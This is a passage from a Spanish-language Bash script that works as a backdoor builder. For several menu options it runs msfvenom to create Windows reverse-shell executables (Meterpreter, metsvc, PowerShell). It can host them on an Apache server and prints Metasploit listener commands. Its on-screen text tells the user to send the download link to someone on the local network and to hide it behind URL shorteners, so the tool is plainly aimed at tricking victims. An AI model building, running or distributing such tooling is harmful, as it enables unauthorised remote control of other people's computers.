			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	  elif [[ $optiondos == 9 || $optiondos == 09 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo "Seleccionado: windows/meterpreter_reverse_tcp"
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				msfconsole
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	  elif [[ $optiondos == 10 || $optiondos == 010 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo -e "Seleccionado: \e[1;36mwindows/meterpreter/reverse_tcp" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	  elif [[ $optiondos == 11 || $optiondos == 011 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo -e "Seleccionado: \e[1;36mwindows/meterpreter/reverse_tcp_dns"
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter/reverse_tcp_dns"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter/reverse_tcp_dns"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter/reverse_tcp_dns"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	 elif [[ $optiondos == 12 || $optiondos == 012 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo -e "\e[1;34m" 	
		echo "Seleccionado: windows/metsvc_reverse_tcp"
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/metsvc_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/metsvc_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/metsvc_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/metsvc_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/metsvc_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/metsvc_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	 elif [[ $optiondos == 13 || $optiondos == 013 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/powershell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/powershell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/powershell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/powershell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

